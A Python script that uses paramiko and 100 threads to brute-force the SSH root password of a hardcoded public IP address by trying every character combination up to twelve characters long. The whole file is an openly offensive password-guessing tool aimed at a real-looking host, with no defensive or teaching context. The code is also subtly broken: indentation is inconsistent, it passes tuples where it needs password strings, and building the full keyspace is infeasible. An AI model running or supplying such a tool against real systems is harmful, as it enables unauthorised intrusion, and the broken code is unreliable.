import paramiko
from threading import Thread
import itertools
HOST = '47.101.154.149'
USERNAME = 'root'
MIN_PASS_LENGTH = 1
MAX_PASS_LENGTH = 12
THREAD_COUNT = 100
class BruteForceThread(Thread):
def __init__(self, name, passwords):
        Thread.__init__(self)
        self.name = name
        self.passwords = passwords
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
def run(self):
        print(f"[+] Thread {self.name} started!")
        for password in self.passwords:
            self.connect_ssh(password)
        self.ssh.close()
        print(f"[-] Thread {self.name} finished!")
 def connect_ssh(self, password):
         try:
            self.ssh.connect(HOST, username=USERNAME, password=password)
            print(f"[+] Password Found: {password}")
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[-] Password incorrect: {password}")
        except Exception as e:
            print(f"[-] Exception occurred while connecting: {e}")
 def create_threads():
    passwords = list(itertools.chain(*[[password for password in itertools.product(chars, repeat=length)]
                                       for length in range(MIN_PASS_LENGTH, MAX_PASS_LENGTH + 1)]))
    thread_count = min(THREAD_COUNT, len(passwords))
    chunk_size = len(passwords) // thread_count
    threads = []
    for i in range(thread_count):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i < thread_count - 1 else None
        thread = BruteForceThread(i, passwords[start:end])
        threads.append(thread)
        thread.start()
    return threads
 if __name__ == '__main__':
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()?<>,./';:\"[]\\{}|_+="
    threads = create_threads()
    for thread in threads:
        thread.join()
